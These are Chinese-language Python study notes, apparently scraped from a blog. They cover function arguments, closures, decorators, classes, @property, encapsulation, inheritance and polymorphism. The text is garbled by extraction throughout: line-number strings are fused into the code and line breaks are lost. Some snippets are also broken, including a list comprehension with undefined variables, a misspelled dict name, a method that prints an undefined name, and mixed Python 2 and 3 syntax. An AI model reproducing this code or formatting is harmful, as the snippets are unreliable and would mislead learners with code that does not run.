range(6)]12345- ```python a_list = [5, 56, 89, 586, 2, 4898] b_list = [5, 8, 69, 4] c_list = [(x, y) for x in a_list for b in b_list if y % x == 0] 常用工具函数 zip()：将多个列表压缩成一个zip对象（可迭代对象），且以更短列表为准 reversed()： ```python[x for x in reversed(b)]123456+ sorted()： - ```python sorted(a, reverse = True) sorted(b, key=len) 控制循环结构使用break结束循环…… 使用continue忽略本次循环剩下的语句…… 使用return结束方法return直接结束整个函数或方法，而不管return处于多少层循环 函数和lambda表达式函数入门定义函数和调用函数…… 为函数提供文档将一段字符串放在函数声明之后、函数体之前，这段字符串将被作为函数的部分，这个文档就是函数的说明文档 可以通过help函数和 __doc__属性进行查看 1234567def func(): ''' hello world! ''' passhelp(func)print(func.__doc__) 多个返回值如果python函数直接返回多个值，python会自动将多个返回值封装成元组 此外，可以通过序列解包获取多个返回值 递归函数…… 函数的参数位置参数位置参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。 调用printme()函数，你必须传入一个参数，不然会出现语法错误： 12345678910#!/usr/bin/python3 #可写函数说明def printme( str ): &quot;打印任何传入的字符串&quot; print (str) return # 调用 printme 函数，不加参数会报错printme() 以上实例输出结果： 1234Traceback (most recent call last): File &quot;test.py&quot;, line 10, in &lt;module&gt; printme()TypeError: printme() missing 1 required positional argument: 'str' 关键字参数关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。 使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。 以下实例在函数 printme() 调用时使用参数名： 12345678910#!/usr/bin/python3 #可写函数说明def printme( str ): &quot;打印任何传入的字符串&quot; print (str) return #调用printme函数printme( str = &quot;hello world&quot;) 以上实例输出结果： 1hello world 以下实例中演示了函数参数的使用不需要使用指定顺序： 1234567891011#!/usr/bin/python3 #可写函数说明def printinfo( name, age ): &quot;打印任何传入的字符串&quot; print (&quot;名字: &quot;, name) print (&quot;年龄: &quot;, age) return #调用printinfo函数printinfo( age=50, name=&quot;zhangsan&quot; ) 以上实例输出结果： 12名字: zhangsan年龄: 50 参数的默认值调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值 12345678910111213#!/usr/bin/python3 #可写函数说明def printinfo( name, age = 35 ): &quot;打印任何传入的字符串&quot; print (&quot;名字: &quot;, name) print (&quot;年龄: &quot;, age) return #调用printinfo函数printinfo( age=50, name=&quot;runoob&quot; )print (&quot;------------------------&quot;)printinfo( name=&quot;runoob&quot; ) 以上实例输出结果： 12345名字: runoob年龄: 50------------------------名字: runoob年龄: 35 未指定成为关键字参数的位置参数必须按照函数的定义位置顺序 关键字参数必须位于位置参数后面（调用和定义） 默认参数定义在形参列表后面 参数收集（个数可变的参数）可以在调用函数时传入任意多个参数 1234def functionname([formal_args,] *var_args_tuple ): &quot;函数_文档字符串&quot; function_suite return [expression] 加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。 1234567891011#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *vartuple ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) print (vartuple) # 调用printinfo 函数printinfo( 70, 60, 50 ) 以上实例输出结果： 123输出: 70(60, 50) 如果在函数调用时没有指定参数，它就是一个空元组。我们也可以不向函数传递未命名的变量。如下实例： 1234567891011121314#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *vartuple ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) for var in vartuple: print (var) return # 调用printinfo 函数printinfo( 10 )printinfo( 70, 60, 50 ) 以上实例输出结果： 123456输出:10输出:706050 此外，python还可以收集关键字参数，在参数面前**表示， 一个函数可以同时包括一个支持“普通“参数收集的参数和一个支持关键字参数收集的参数 123456789101112#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *hello, **vardict ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) print (hello) print (vardict) # 调用printinfo 函数printinfo(1, &quot;你好&quot;, &quot;hi&quot;, a=2,b=3) 以上实例输出结果： 12345输出: 1你好hi{'a': 2, 'b': 3} 声明函数时，参数中星号 ***** 可以单独出现，例如: 12def f(a,b,*,c): return a+b+c 如果单独出现星号 ***** 后的参数必须用关键字传入。 123456789&gt;&gt;&gt; def f(a,b,*,c):... return a+b+c... &gt;&gt;&gt; f(1,2,3) # 报错Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: f() takes 2 positional arguments but 3 were given&gt;&gt;&gt; f(1,2,c=3) # 正常6 逆向参数收集逆向参数收集，是指在程序已有列表、元组、字典等对象的前提下，把它们的元素“拆开”后传给函数的参数 逆向参数收集需要在传入的列表、元组参数之前添加一个星号，在字典参数之前添加两个星号 123456def test(name, message): print('用户是：', name) print('欢迎消息：', message)my_list = ['孙悟空', '欢迎来到水帘洞']test(*my_list) 实际上，即使是支持收集的参数，如果程序需要将一个元组传给该参数，那么同样需要使用逆向收集，例如以下代码： 123456def foo(name, *nums): print('name参数:', name) print('nums参数:', nums)my_tuple = (1, 2, 3)foo('fkit', *my_tuple) 输出如下： 12name参数：fkitnums参数：（1，2，3） 使用逆向收集，my_tuple第一个元素传给name参数，剩下的传给nums参数 1foo(*my_tuple) 输出如下： 12name参数：1nums参数：（2，3） 如果不使用逆向收集，整个元组将作为一个参数 12345foo(my_tuple)#输出name参数：（1，2，3）nums参数：（） 字典也支持逆向收集，字典将会以关键字的形式传入。 123456def bar(book, price, desc): print(book, '这本书的价格是：', price) print('描述信息：', desc)my_dict = {'price':89, 'book':'疯狂python讲义', 'desc':'这是一本系统全面的python学习图书'}bar(**mydict) 函数的参数传递机制 在python函数中对参数直接使用“=”符号赋值没有用 如果让函数修改某些数据，可以封装成列表字典等可变对象，再作为参数传入函数 变量作用域 局部变量 全局变量 globals()：返回全局范围内所有变量组成的“变量字典” locals()：返回当前局部范围内所有变量组成的“变量字典” vars(object)：获取在指定对象范围内所有变量组成的“变量字典” locals()在全局范围内调用=globals() globals()生成的字典修改会改变全局变量本身，locals()字典修改不会改变局部变量本身 局部遮蔽全局变量的处理： 访问一下被遮蔽的全局变量 在函数中声明全局变量 1global name 局部函数当出现局部函数内的变量遮蔽它所在函数内的局部变量时，可以定义nonlocal 1nonlocal name 区别： global：声明全局变量 nonlocal：声明访问当前函数所在函数内的局部变量 函数的高级内容使用函数变量当把函数赋值给变量之后，接下来程序也可通过变量来调用函数 使用函数作为函数形参12345678def func_a(func, *args, **kwargs): print(func(*args, **kwargs))def func_b(*args): return argsif __name__ == '__main__': func_a(func_b, 1, 2, 3) 在代码中，将函数func_b作为函数func_a的参数传入，将函数func_b的参数以元组args传入，并在调用func_b时，作为func_b的参数。 运行结果： 1(1, 2, 3) 但是这里存在一个问题，但func_a和func_b需要同名的参数时，就会出现异常，如： 123456789def func_a(arg_a, func, **kwargs): print(arg_a) print(func(**kwargs))def func_b(arg_a): print(arg_a)if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) 异常信息： 1TypeError: func_b() missing 1 required positional argument: 'arg_a' 虽然通过修改，手动将arg_a作为参数传入func中进行调用，可以正常运行，但这明显不符合设计初衷：在func_a中执行func(**kwargs)时，很可能并不知道func到底需要什么参数。换句话说，如果已经提前知道需要调用什么函数，那完全不必要把函数作为参数传入另一个函数并调用，直接调用函数即可。 123456789def func_a(arg_a, func, **kwargs): print(arg_a) func(arg_a=arg_a, **kwargs)def func_b(arg_a): print(arg_a)if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) 当加入第三个函数，func_c，它不需要arg_a这个参数时，就会出现问题。 12345678910111213def func_a(arg_a, func, **kwargs): print(arg_a) func(arg_a=arg_a, **kwargs)def func_b(arg_a): print(arg_a)def func_c(): print('Hello World')if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) func_a(arg_a='Hello Python', func=func_c) 异常结果： 1TypeError: func_c() got an unexpected keyword argument 'arg_a' 目前想到的解决办法是尽量避免func_a存在跟其他函数相同的参数，比如把func_a的arg_a参数改成func_a_arg_a。 12345678910111213def func_a(func_a_arg_a, func, **kwargs): print(func_a_arg_a) func(**kwargs)def func_b(arg_a): print(arg_a)def func_c(): print('Hello World')if __name__ == '__main__': func_a(func_a_arg_a='temp', arg_a='Hello Python', func=func_b) func_a(func_a_arg_a='temp', func=func_c) 使用函数作为返回值函数作为返回值高阶函数除了可以接收函数作为参数外，还可以把函数作为结果值返回。 12345678910111213141516171819202122def lazy_sum(*args): def sum(): ax=0 for n in args: ax = ax + n return ax return sumf = lazy_sum(1,2,3,4,5)print f# &lt;function sum at 0x02657770&gt;# lazy_sum(1,2,3,4,5)返回的是一个指向求和的函数的函数名。# 在调用lazy_sum(1,2,3,4,5)的时候，不立刻求和，而是根据后面代码的需要在计算。print f()# 15# 用f()调用求和函数，计算出结果。f1 = lazy_sum(1,2,3,4,5,6)f2 = lazy_sum(1,2,3,4,5,6)print f1 == f2# False# lazy_sum()每调用一次，都会返回一个独一无二的函数地址。 例中，lazy_sum中的内部函数sum引用了外部函数lazy_sum的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量已经保存在返回的函数sum中了。我们称这为 闭包。 注意到返回的函数在其定义内部引用了局部变量args，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。 另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。我们来看一个例子： 123456789101112131415def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fsf1, f2, f3 = count()print f1()print f2()print f3()# 9# 9# 9 结果全部都是9. 不是预期的1,4,9！ 遂在编辑器中不断更改并调试运行观察变量的变化过程： 12345678910111213141516171819# -*- coding: utf-8 -*-def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fs# f1, f2, f3 = count()#将上述代码分开写：f1 = count()f2 = count()f3 = count()print(f1())print(f2())print(f3()) 结果编译器报错： Traceback (most recent call last):File “***.py”, line 16, in print(f1())TypeError: ‘list’ object is not callable f1 = count()这条语句执行时，count()函数会先执行，并将结果fs（这是一个包含三个元素（值是三个不同函数）的list！）返还f1。所以f1()是将list当函数用，故报错！ f2 = count()和f3 = count()也是这个道理。 所以第一个要弄清楚的是 ：初始代码中的f1, f2, f3 = count()是将count() 中返回值（list）的三个元素（元素值是函数）分别赋值给f1,f2,f3!此时它们是函数！ 修改代码： 123456789101112131415161718# -*- coding: utf-8 -*-def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fs# f1, f2, f3 = count()f1 = count()f2 = count()f3 = count()print(f1[0]())print(f2[0]())print(f3[0]()) 结果仍然是： 9 9 9 因为f1[0]()中存放的就是函数f, 但此时i是3，故返回输出9！ 所以返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 网上例子，有稍许啰嗦 局部函数与lambda表达式回顾局部函数…… 使用lambda表达式代替局部函数1lambda [parameter_list]: 表达式 lambda表达式必须使用lambda关键字定义 在lambda关键字后，冒号左边是参数列表，可以没有参数，也可以有多个参数，逗号隔开，冒号右边是lambda表达式的返回值 用途： 单行函数，省去了定义函数的过程，代码更加简洁 对于不需要多次使用的函数，lambda使用完后可以立即释放，提高了性能 类和对象类和对象定义类 __init__：构造方法，用于构造该类的对象 12class Student(object): pass 对象的产生和使用创建对象的根本途径是构造方法 1234567891011class Student(object): def __init__(self, name, score): self.name = name self.score = score &gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.name'Bart Simpson'&gt;&gt;&gt; bart.score59 动态增加实例变量 动态删除实例变量 del 为P对象动态增加方法，python不会自动将调用者自动绑定到第一个参数（即使将第一个参数命名为self也没用） 1234567891011# 先定义一个函数def info(self): print(&quot;---info函数---&quot;, self)# 使用info对p的foo方法赋值（动态增加方法）p.foo = info# python不会自动将调用者绑定到第一个参数# 因此程序需要手动将调用者绑定到第一参数p.foo(p)p.bar = lambda self: print(&quot;--lambda表达式---&quot;, self)p.bar(p) 如果希望动态增加的方法也能自动绑定到第一个参数，则可借助于types模块下的MethodType进行包装 12345678def intro_func(self, content): print(&quot;我是一个人，信息为：%s&quot; % content)# 导入MethodTypefrom types import MethodType# 使用MethodType对intro_func进行包装，将该函数的第一个参数绑定为pp.intro = MethodType(intro_func, p)# 第一个参数已经绑定了，无须传入p.intro(&quot;生活在别处&quot;) 实例方法和自动绑定self对于类中定义的实例方法，python会自动绑定方法的第一个参数，第一个参数总是指向调用该方法的对象 在构造方法中引用该构造方法正在初始化的对象 在普通实例方法中引用调用该方法的对象 当self参数作为对象的默认引用时，程序可以像访问普通变量一样来访问这个self参数，甚至可以把self参数当成实例方法的返回值 1234567891011class ReturnSelf: def grow(self): if hasattr(self, 'age'): self.age += 1 else: self.age = 1 return selfrs = ReturnSelf()rs.grow().grow().grow()print(&quot;rs的age属性值是：&quot;, rs.age)# 简洁，确可能造成实际意义的模糊 方法类也能调用实例方法使用类调用实例方法的第一个参数要绑定 1234567891011121314151617class User: def walk (self): print(self, '正在走') u = User()User.walk(u)&lt;__main__.User object at 0x0000015AD3CB1F48&gt; 正在走User.walk(User)&lt;class '__main__.User'&gt; 正在走User.walk('fg')fg 正在走 类方法与静态方法python支持定义类方法，甚至定义静态方法。 python会自动绑定类方法的第一个参数，类方法的第一个参数（通常建议参数名为cls）会自动绑定到类本身；静态方法则不会自动绑定。 类方法：@classmethod 静态方法：@staticmethod 123456789101112131415class Bird: @classmethod def fly(cls): print('类方法fly：', fly) @staticmethod def info(p): print('静态方法info：', p) Bird.fly()Bird.info('crazyit')b = Bird()b.fly()b.info('fkit') @函数装饰器使用“@函数”（A）装饰另一个函数（B）： 将被修饰的函数（B）作为参数传给@符号引用的函数（A） 将（B）替换（装饰）城成第一步的返回值 下面资料来源于网络： 函数中返回函数: 123456789101112131415161718192021def hi(name=&quot;yasoob&quot;): def greet(): return &quot;now you are in the greet() function&quot; def welcome(): return &quot;now you are in the welcome() function&quot; if name == &quot;yasoob&quot;: return greet else: return welcome a = hi()print(a)#outputs: &lt;function greet at 0x7f2143c01500&gt; #上面清晰地展示了`a`现在指向到hi()函数中的greet()函数#现在试试这个 print(a())#outputs: now you are in the greet() function 在 if/else 语句中我们返回 greet 和 welcome，而不是 greet() 和 welcome()。为什么那样？这是因为当你把一对小括号放在后面，这个函数就会执行；然而如果你不放括号在它后面，那它可以被到处传递，并且可以赋值给别的变量而不去执行它。 将函数作为参数传给另一个函数: 12345678910def hi(): return &quot;hi yasoob!&quot; def doSomethingBeforeHi(func): print(&quot;I am doing some boring work before executing hi()&quot;) print(func()) doSomethingBeforeHi(hi)#outputs:I am doing some boring work before executing hi()# hi yasoob! 装饰器： 123456789101112131415161718192021222324def a_new_decorator(a_func): def wrapTheFunction(): print(&quot;I am doing some boring work before executing a_func()&quot;) a_func() print(&quot;I am doing some boring work after executing a_func()&quot;) return wrapTheFunction@a_new_decoratordef a_function_requiring_decoration(): &quot;&quot;&quot;Hey you! Decorate me!&quot;&quot;&quot; print(&quot;I am the function which needs some decoration to &quot; &quot;remove my foul smell&quot;) a_function_requiring_decoration()#outputs: I am doing some boring work before executing a_func()# I am the function which needs some decoration to remove my foul smell# I am doing some boring work after executing a_func() #the @a_new_decorator is just a short way of saying:a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) 在对 Python 装饰器的工作原理有一个基本的理解。如果我们运行如下代码会存在一个问题： 12print(a_function_requiring_decoration.__name__)# Output: wrapTheFunction 这并不是我们想要的！Ouput输出应该是”a_function_requiring_decoration”。这里的函数被warpTheFunction替代了。它重写了我们函数的名字和注释文档(docstring)。幸运的是Python提供给我们一个简单的函数来解决这个问题，那就是functools.wraps。我们修改上一个例子来使用functools.wraps： 123456789101112131415161718from functools import wraps def a_new_decorator(a_func): @wraps(a_func) def wrapTheFunction(): print(&quot;I am doing some boring work before executing a_func()&quot;) a_func() print(&quot;I am doing some boring work after executing a_func()&quot;) return wrapTheFunction @a_new_decoratordef a_function_requiring_decoration(): &quot;&quot;&quot;Hey yo! Decorate me!&quot;&quot;&quot; print(&quot;I am the function which needs some decoration to &quot; &quot;remove my foul smell&quot;) print(a_function_requiring_decoration.__name__)# Output: a_function_requiring_decoration 蓝本规范： 1234567891011121314151617181920from functools import wrapsdef decorator_name(f): @wraps(f) def decorated(*args, **kwargs): if not can_run: return &quot;Function will not run&quot; return f(*args, **kwargs) return decorated @decorator_namedef func(): return(&quot;Function is running&quot;) can_run = Trueprint(func())# Output: Function is running can_run = Falseprint(func())# Output: Function will not run 注意：@wraps接受一个函数来进行装饰，并加入了复制函数名称、注释文档、参数列表等等的功能。这可以让我们在装饰器里面访问在装饰之前的函数的属性。 使用场景： 授权： 装饰器能有助于检查某个人是否被授权去使用一个web应用的端点(endpoint)。它们被大量使用于Flask和Django web框架中。这里是一个例子来使用基于装饰器的授权： 12345678910from functools import wraps def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): auth = request.authorization if not auth or not check_auth(auth.username, auth.password): authenticate() return f(*args, **kwargs) return decorated 日志： 日志是装饰器运用的另一个亮点。 1234567891011121314151617from functools import wraps def logit(func): @wraps(func) def with_logging(*args, **kwargs): print(func.__name__ + &quot; was called&quot;) return func(*args, **kwargs) return with_logging @logitdef addition_func(x): &quot;&quot;&quot;Do some math.&quot;&quot;&quot; return x + x result = addition_func(4)# Output: addition_func was called 带参数的装饰器： 在函数中嵌入装饰器 12345678910111213141516171819202122232425262728293031from functools import wraps def logit(logfile='out.log'): def logging_decorator(func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + &quot; was called&quot; print(log_string) # 打开logfile，并写入内容 with open(logfile, 'a') as opened_file: # 现在将日志打到指定的logfile opened_file.write(log_string + '\\n') return func(*args, **kwargs) return wrapped_function return logging_decorator @logit()def myfunc1(): pass myfunc1()# Output: myfunc1 was called# 现在一个叫做 out.log 的文件出现了，里面的内容就是上面的字符串 @logit(logfile='func2.log')def myfunc2(): pass myfunc2()# Output: myfunc2 was called# 现在一个叫做 func2.log 的文件出现了，里面的内容就是上面的字符串 装饰器类： 1234567891011121314151617181920212223from functools import wraps class logit(object): def __init__(self, logfile='out.log'): self.logfile = logfile def __call__(self, func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + &quot; was called&quot; print(log_string) # 打开logfile并写入 with open(self.logfile, 'a') as opened_file: # 现在将日志打到指定的文件 opened_file.write(log_string + '\\n') # 现在，发送一个通知 self.notify() return func(*args, **kwargs) return wrapped_function def notify(self): # logit只打日志，不做别的 pass 现在，我们给 logit 创建子类，来添加 email 的功能(虽然 email 这个话题不会在这里展开)。 123456789101112class email_logit(logit): ''' 一个logit的实现版本，可以在函数调用时发送email给管理员 ''' def __init__(self, email='admin@myproject.com', *args, **kwargs): self.email = email super(email_logit, self).__init__(*args, **kwargs) def notify(self): # 发送一封email到self.email # 这里就不做实现了 pass 装饰器执行顺序： 123456789101112131415161718192021222324252627282930313233def decorator_a(func): print 'Get in decorator_a' def inner_a(*args, **kwargs): print 'Get in inner_a' return func(*args, **kwargs) return inner_adef decorator_b(func): print 'Get in decorator_b' def inner_b(*args, **kwargs): print 'Get in inner_b' return func(*args, **kwargs) return inner_b@decorator_b@decorator_adef f(x): print 'Get in f' return x * 2# 运行结果：# Get in decorator_a# Get in decorator_bf(1)-------------------------------------------------------------------实际上运行的结果如下:Get in decorator_aGet in decorator_bGet in inner_bGet in inner_aGet in f 在实际应用的场景中，当我们采用上面的方式写了两个装饰方法比如先验证有没有登录 @login_required ， 再验证权限够不够时 @permision_allowed 时，我们采用下面的顺序来装饰函数: 12345@login_required@permision_alloweddef f() # Do something return 再论类命名空间…… 成员变量类变量和实例变量…… 使用property函数定义属性https://www.liaoxuefeng.com/wiki/1016959663602400/1017502538658208#0 在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改： 12s = Student()s.score = 9999 这显然不合逻辑。为了限制score的范围，可以通过一个set_score()方法来设置成绩，再通过一个get_score()来获取成绩，这样，在set_score()方法里，就可以检查参数： 1234567891011class Student(object): def get_score(self): return self._score def set_score(self, value): if not isinstance(value, int): raise ValueError('score must be an integer!') if value &lt; 0 or value &gt; 100: raise ValueError('score must between 0 ~ 100!') self._score = value 现在，对任意的Student实例进行操作，就不能随心所欲地设置score了： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.set_score(60) # ok!&gt;&gt;&gt; s.get_score()60&gt;&gt;&gt; s.set_score(9999)Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 但是，上面的调用方法又略显复杂，没有直接用属性这么直接简单。 有没有既能检查参数，又可以用类似属性这样简单的方式来访问类的变量呢？对于追求完美的Python程序员来说，这是必须要做到的！ 还记得装饰器（decorator）可以给函数动态加上功能吗？对于类的方法，装饰器一样起作用。Python内置的@property装饰器就是负责把一个方法变成属性调用的： 12345678910111213class Student(object): @property def score(self): return self._score @score.setter def score(self, value): if not isinstance(value, int): raise ValueError('score must be an integer!') if value &lt; 0 or value &gt; 100: raise ValueError('score must between 0 ~ 100!') self._score = value @property的实现比较复杂，我们先考察如何使用。把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 注意到这个神奇的@property，我们在对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的。 还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性： 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 上面的birth是可读写属性，而age就是一个只读属性，因为age可以根据birth和当前时间计算出来。 要特别注意：属性的方法名不要和实例变量重名。例如，以下的代码是错误的： 123456class Student(object): # 方法名称和实例变量均为birth: @property def birth(self): return self.birth 这是因为调用s.birth时，首先转换为方法调用，在执行return self.birth时，又视为访问self的属性，于是又转换为方法调用，造成无限递归，最终导致栈溢出报错RecursionError。 小结 @property广泛应用在类的定义中，可以让调用者写出简短的代码，同时保证对参数进行必要的检查，这样，程序运行时就减少了出错的可能性。 隐藏和封装封装、继承、多态 在Class内部，可以有属性和方法，而外部代码可以通过直接调用实例变量的方法来操作数据，这样，就隐藏了内部的复杂逻辑。 但是，从前面Student类的定义来看，外部代码还是可以自由地修改一个实例的name、score属性： 123456&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.score59&gt;&gt;&gt; bart.score = 99&gt;&gt;&gt; bart.score99 如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线__，在Python中，实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把Student类改一改： 12345678class Student(object): def __init__(self, name, score): self.__name = name self.__score = score def print_score(self): print('%s: %s' % (self.__name, self.__score)) 改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问实例变量.__name和实例变量.__score了： 12345&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.__nameTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: 'Student' object has no attribute '__name' 这样就确保了外部代码不能随意修改对象内部的状态，这样通过访问限制的保护，代码更加健壮。 但是如果外部代码要获取name和score怎么办？可以给Student类增加get_name和get_score这样的方法： 12345678class Student(object): ... def get_name(self): return self.__name def get_score(self): return self.__score 如果又要允许外部代码修改score怎么办？可以再给Student类增加set_score方法： 12345class Student(object): ... def set_score(self, score): self.__score = score 你也许会问，原先那种直接通过bart.score = 99也可以修改啊，为什么要定义一个方法大费周折？因为在方法中，可以对参数做检查，避免传入无效的参数： 12345678class Student(object): ... def set_score(self, score): if 0 &lt;= score &lt;= 100: self.__score = score else: raise ValueError('bad score') 需要注意的是，在Python中，变量名类似__xxx__的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用__name__、__score__这样的变量名。 有些时候，你会看到以一个下划线开头的实例变量名，比如_name，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问”。 双下划线开头的实例变量是不是一定不能从外部访问呢？其实也不是。不能直接访问__name是因为Python解释器对外把__name变量改成了_Student__name，所以，仍然可以通过_Student__name来访问__name变量： 12&gt;&gt;&gt; bart._Student__name'Bart Simpson' 但是强烈建议你不要这么干，因为不同版本的Python解释器可能会把__name改成不同的变量名。 总的来说就是，Python本身没有任何机制阻止你干坏事，一切全靠自觉。 最后注意下面的这种错误写法： 123456&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.get_name()'Bart Simpson'&gt;&gt;&gt; bart.__name = 'New Name' # 设置__name变量！&gt;&gt;&gt; bart.__name'New Name' 表面上看，外部代码“成功”地设置了__name变量，但实际上这个__name变量和class内部的__name变量不是一个变量！内部的__name变量已经被Python解释器自动改成了_Student__name，而外部代码给bart新增了一个__name变量。不信试试： 12&gt;&gt;&gt; bart.get_name() # get_name()内部返回self.__name'Bart Simpson' 类的继承继承的语法12class SubClass(SuperClass1, SuperClass2, ...): # 类定义部分 关于多继承如果多个父类中包含了同名的方法，排在前面的父类中的方法会“遮蔽”排在后面的父类中的同名方法 重写父类的方法父类的方法不适用子类时，在子类重新定义将其覆盖即可 使用未绑定方法调用被重写的方法123456789101112class BaseClass: def foo(self): print('父类中定义的foo方法')class SubClass(BaseClass): def foo(self): print('子类重写父类中的foo方法') def bar(self): print('执行bar方法') self.foo() BaseClass.foo(self)sc = SubClass()sc.bar() 123执行bar方法子类重写父类中的foo方法父类中定义的foo方法 使用super函数调用父类的构造方法python的子类也会继承父类的构造方法，如果子类有多个直接父类，那么排在前面的父类构造方法会被优先使用 为了让子类能同时初始化两个父类中的实例变量，子类需要定义自己的构造方法，即重写父类的构造方法。且如果子类重写了父类的构造方法，则子类的构造方法必须调用父类的构造方法。 super() 函数是用于调用父类(超类)的一个方法。 super() 是用来解决多重继承问题的，直接用类名调用父类方法在使用单继承的时候没问题，但是如果使用多继承，会涉及到查找顺序（MRO）、重复调用（钻石继承）等种种问题。 MRO 就是类的方法解析顺序表, 其实也就是继承父类方法时的顺序表。 以下是 super() 方法的语法: 1super(type[, object-or-type]) type – 类。 object-or-type – 类，一般是 self 123456789class A: def add(self, x): y = x+1 print(y)class B(A): def add(self, x): super().add(x)b = B()b.add(2) # 3 12345678910111213141516171819202122232425#!/usr/bin/python# -*- coding: UTF-8 -*- class FooParent(object): def __init__(self): self.parent = 'I\\'m the parent.' print ('Parent') def bar(self,message): print (&quot;%s from Parent&quot; % message) class FooChild(FooParent): def __init__(self): # super(FooChild,self) 首先找到 FooChild 的父类（就是类 FooParent），然后把类 FooChild 的对象转换为类 FooParent 的对象 super(FooChild,self).__init__() print ('Child') def bar(self,message): super(FooChild, self).bar(message) print ('Child bar fuction') print (self.parent) if __name__ == '__main__': fooChild = FooChild() fooChild.bar('HelloWorld') 1234567执行结果：ParentChildHelloWorld from ParentChild bar fuctionI'm the parent. python的动态性动态属性与__slots__希望为所有实例都添加方法，则可以通过为类添加方法来实现 __slots__属性可以限制性的为某个类动态添加属性和方法 __slots__属性值是一个元组，该元组的所有元素列出了该类的实例允许动态添加的所有属性名和方法名 __slots__属性并不限制通过类来动态添加属性或方法 __slots__属性指定的限制只对当前类的实例有效，该类派生出来的子类不起作用 使用type()函数定义类123456def fn(self): print('fn函数')# 使用type()定义dog类Dog = type('Dog', (object,), dict(walk=fn, age=6))# 创建Dog对象d = Dog() 参数一：创建的类名 参数二：该类继承的父类集合，元组形式 参数三：该字典对象为该类绑定的类变量和方法 使用metaclass没有 metaclass 的情况下，子类继承父类，父类是无法对子类执行操作的，但有了 metaclass，就可以对子类进行操作，就像装饰器那样可以动态定制和修改被装饰的类，metaclass 可以动态的定制或修改继承它的子类。 https://www.cnblogs.com/yssjun/p/9832526.html 多态1234567891011121314151617181920212223242526272829303132333435363738394041class Animal(object): def run(self): print('Animal is running...') class Dog(Animal): def run(self): print('Dog is running...')class Cat(Animal): def run(self): print('Cat is running...')def run_twice(animal): animal.run() animal.run() # 当我们传入Animal的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Animal())Animal is running...Animal is running...# 当我们传入Dog的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Dog())Dog is running...Dog is running...# 当我们传入Cat的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Cat())Cat is running...Cat is running...# 再定义一个Tortoise类型，也从Animal派生：class Tortoise(Animal): def run(self): print('Tortoise is running slowly...')&gt;&gt;&gt; run_twice(Tortoise())Tortoise is running slowly...Tortoise is running slowly... 你会发现，新增一个Animal的子类，不必对run_twice()做任何修改，实际上，任何依赖Animal作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。 多态的好处就是，当我们需要传入Dog、Cat、Tortoise……时，我们只需要接收Animal类型就可以了，因为Dog、Cat、Tortoise……都是Animal类型，然后，按照Animal类型进行操作即可。由于Animal类型有run()方法，因此，传入的任意类型，只要是Animal类或者子类，就会自动调用实际类型的run()方法，这就是多态的意思： 